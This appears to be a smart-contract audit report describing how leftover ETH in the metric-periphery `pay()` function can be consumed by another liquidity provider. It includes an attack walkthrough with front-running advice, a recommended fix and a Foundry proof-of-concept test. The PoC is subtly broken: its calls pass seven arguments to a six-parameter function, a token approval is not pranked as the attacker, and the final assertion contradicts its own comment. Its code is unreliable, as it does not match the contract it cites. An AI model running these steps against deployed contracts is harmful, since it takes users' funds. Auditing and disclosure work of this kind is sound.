### Title
Cross-LP ETH Theft via Partial Native Balance Branch in `pay()` — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` uses the contract's entire `address(this).balance` as a subsidy when paying WETH to a pool. Because native ETH balance is global and persistent across transactions, any ETH left in the contract by a prior LP (who sent excess ETH and did not yet call `refundETH`) is silently consumed for a subsequent LP's liquidity add, causing direct loss of the prior LP's principal.

---

### Finding Description

The partial branch in `pay()` fires whenever `0 < address(this).balance < value`: [1](#0-0) 

```solidity
} else if (nativeBalance > 0) {
    IWETH9(WETH).deposit{value: nativeBalance}();
    IERC20(WETH).safeTransfer(recipient, nativeBalance);
    IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
}
```

`nativeBalance` is `address(this).balance` — a global, persistent value with no per-user accounting. The function wraps and forwards **all** ETH currently held by the contract, regardless of which caller deposited it, then pulls only the shortfall from the current `payer` via `safeTransferFrom`.

The attack path:

1. **LP-A** calls `addLiquidityExactShares{value: 1 ETH}(...)` directly (not via `multicall`). The pool requests 0.5 ETH; the first branch fires, wrapping 0.5 ETH and sending it to the pool. The remaining **0.5 ETH stays in the contract**. [2](#0-1) 

2. LP-A has not yet called `refundETH()`. The 0.5 ETH is now unprotected in the contract's balance.

3. **LP-B** (attacker) calls `addLiquidityExactShares{value: 0}(...)` for a WETH pool, with parameters that cause the pool to request, say, 2 ETH in the callback. In `pay(WETH, LP-B, pool, 2 ETH)`:
   - `nativeBalance = 0.5 ETH` (LP-A's leftover)
   - `value = 2 ETH`
   - Condition `0 < 0.5 < 2` → partial branch fires
   - LP-A's 0.5 ETH is wrapped and forwarded to the pool
   - Only 1.5 ETH worth of WETH is pulled from LP-B

4. LP-A's `refundETH()` call (whenever it arrives) returns 0 ETH. [3](#0-2) 

The `addLiquidityExactShares` functions are `payable` and callable directly without `multicall`, so LP-A can legitimately send excess ETH expecting to reclaim it: [4](#0-3) 

The interface documentation itself acknowledges this pattern ("unused ETH can be reclaimed via `refundETH` in the same multicall"), but does not enforce it — the function is callable standalone. [5](#0-4) 

---

### Impact Explanation

LP-A suffers a direct, unrecoverable loss of native ETH principal. LP-B receives more WETH-backed liquidity than they paid for (the shortfall is subsidized by LP-A's ETH). This is a cross-user fund theft through a public entrypoint with no privileged preconditions.

---

### Likelihood Explanation

Any user who calls `addLiquidityExactShares` directly (not via `multicall` + `refundETH`) and sends more ETH than the pool requests is immediately vulnerable. An attacker monitoring the mempool can front-run the victim's `refundETH` call, or simply call `addLiquidityExactShares` in the next block after observing the leftover ETH on-chain. The `receive()` guard (only WETH can push ETH) does not prevent this — the ETH arrives legitimately via `msg.value` on the payable entry point. [6](#0-5) 

---

### Recommendation

Track per-caller ETH deposits in transient storage alongside the pay context, and in `pay()` only use up to the amount the current `payer` deposited in this call. Alternatively, restrict the partial branch to only consume ETH that was sent in the current transaction by comparing `msg.value` (stored in transient storage at call entry) against `nativeBalance`, and revert or skip if the balance exceeds what the current caller sent.

---

### Proof of Concept

```solidity
// Foundry test sketch
function test_crossLpEthTheft() public {
    // LP-A sends 1 ETH, pool only needs 0.5 ETH
    vm.deal(lpA, 1 ether);
    vm.prank(lpA);
    adder.addLiquidityExactShares{value: 1 ether}(
        pool, lpA, 1, deltaRequiring0_5Eth, 1 ether, 0, ""
    );
    // 0.5 ETH remains in adder; lpA has not called refundETH
    assertEq(address(adder).balance, 0.5 ether);

    // LP-B (attacker) calls with 0 ETH, pool requests 2 ETH
    // partial branch: wraps lpA's 0.5 ETH + pulls 1.5 ETH WETH from lpB
    vm.deal(lpB, 0);
    deal(address(weth), lpB, 2 ether);
    weth.approve(address(adder), type(uint256).max);
    vm.prank(lpB);
    adder.addLiquidityExactShares{value: 0}(
        pool, lpB, 2, deltaRequiring2Eth, 2 ether, 0, ""
    );

    // lpA's ETH is gone
    assertEq(address(adder).balance, 0);
    vm.prank(lpA);
    adder.refundETH(); // returns 0 ETH — lpA lost 0.5 ETH
    assertEq(lpA.balance, 0.5 ether); // was 0.5 ETH short, now 0
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L74-77)
```text
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L78-81)
```text
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L71-81)
```text
  function addLiquidityExactShares(
    address pool,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateDeltas(deltas);
    return _addLiquidity(pool, msg.sender, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/interfaces/IMetricOmmPoolLiquidityAdder.sol (L15-17)
```text
/// @dev Native ETH input uses the same multicall pattern as the swap router: send ETH with the add call (or
///      `multicall{value}`) when the pool's WETH leg is token0 or token1; unused ETH can be reclaimed via
///      `refundETH` in the same multicall.
```
